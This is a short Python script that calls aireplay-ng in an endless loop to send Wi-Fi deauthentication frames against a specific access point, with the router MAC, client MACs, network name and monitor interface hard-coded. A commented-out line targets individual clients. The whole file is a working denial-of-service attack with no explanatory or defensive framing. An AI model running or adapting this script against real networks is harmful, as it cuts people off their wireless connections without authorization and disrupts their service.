from os import system
from time import sleep

ROUTER_MAC = '94:2C:B3:45:41:F1'
CLIENT_MAC = ['18:89:5B:00:DF:72','9C:FC:01:86:7B:75']
INTERFACE = 'wlp0s18f0u3mon'
ESSID = '"Jiang Songhai"'


def deauth():
    while True:
        for x in CLIENT_MAC:
            # system('aireplay-ng -0 5 -a {} -c {} -e {} {}'.format(ROUTER_MAC, x, ESSID, INTERFACE))
            system('aireplay-ng -0 5 -a {} -e {} {}'.format(ROUTER_MAC, ESSID, INTERFACE))
            sleep(3)

deauth()
